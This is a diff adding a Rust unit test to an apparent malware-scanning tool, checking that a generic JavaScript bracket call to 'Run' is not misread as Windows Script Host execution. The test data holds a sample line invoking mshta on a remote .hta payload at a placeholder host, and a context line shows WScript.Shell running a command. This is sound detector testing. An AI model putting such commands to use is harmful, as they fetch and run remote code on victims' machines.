@@ -20175,6 +20175,27 @@ new ActiveXObject("WScript.Shell").Run(cmd);"#
     }
 
     #[test]
+    fn js_non_wsh_bracket_run_does_not_emit_download() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var task = {};
+task["Run"]("mshta js-bracket-run-fp.example/payload.hta");"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "http://js-bracket-run-fp.example/payload.hta"
+                )
+            }),
+            "generic JS bracket Run should not be treated as WSH execution: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_wscript_shell_exec_schemeless_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let js =
